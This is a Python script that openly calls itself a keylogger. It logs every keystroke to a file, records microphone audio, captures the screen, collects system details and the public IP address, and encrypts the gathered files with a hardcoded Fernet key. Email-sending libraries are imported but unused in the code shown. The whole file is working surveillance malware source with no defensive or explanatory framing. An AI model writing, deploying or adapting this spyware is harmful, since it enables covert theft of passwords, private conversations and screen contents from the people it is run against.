# Required Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from pynput.keyboard import Key, Listener
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# Constants
username = getpass.getuser()
file_path = os.path.join("C:\\Users", username, "Documents", "Projects", "KeyLogger")
system_information = "system_info.txt"
clipboard_information = "clipboard_info.txt"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
key = b"RpAJlSa_CGXhwtDSjnRvX-YesCOOJomns6tA2jN459s="

# Encrypted File Names
encrypted_file_names = {
    "system_info": "e_system.txt",
    "audio": "e_audio.txt",
    "screenshot": "e_screenshot.txt",
    "key_log": "e_key.txt",
}

# Functions
def computer_information():
    with open(os.path.join(file_path, system_information), 'a') as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write(f"Public IP Address: {public_ip}\n")
        except Exception:
            f.write("Couldn't get Public IP Address (This happens sometimes)\n")

        f.write(f"Processor Info: {platform.processor()}\n")
        f.write(f"Platform OS and Version: {platform.system()} {platform.version()}\n")
        f.write(f"Machine Info: {platform.machine()}\n")
        f.write(f"Host Name: {hostname}\n")
        f.write(f"Private Address: {ipaddr}\n")
        f.close()


def microphone():
    print("wait for audio file generation")
    fs = 44100
    myrecording = sd.rec(int(microphone_time * fs), samplerate=fs, channels=2)
    sd.wait()
    write(os.path.join(file_path, audio_information), fs, myrecording)
    print("Audio Successfully Generated")

def screenshot_data():
    screenshot = ImageGrab.grab()
    screenshot.save(os.path.join(file_path, screenshot_information))
    print("Screenshot Successfully Saved")
    screenshot.close()

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()

def write_file(keys):
    with open(os.path.join(file_path, "key_log.txt"), 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
    f.close()

def on_release(key):
    if key == Key.esc:
        print("Exiting KeyLogger")
        return False

# Start Listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Collect Data
computer_information()
screenshot_data()
microphone()

# Encryption Logic
files_to_encrypt = [
    os.path.join(file_path, system_information),
    os.path.join(file_path, audio_information),
    os.path.join(file_path, screenshot_information),
    os.path.join(file_path,"key_log.txt"),
]

# Encrypting files
for file_to_encrypt, encrypted_file_name in zip(files_to_encrypt, encrypted_file_names.values()):
    with open(file_to_encrypt, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    # Write the encrypted data to the corresponding encrypted file
    with open(os.path.join(file_path, encrypted_file_name), 'wb') as f:
        f.write(encrypted)
    f.close()   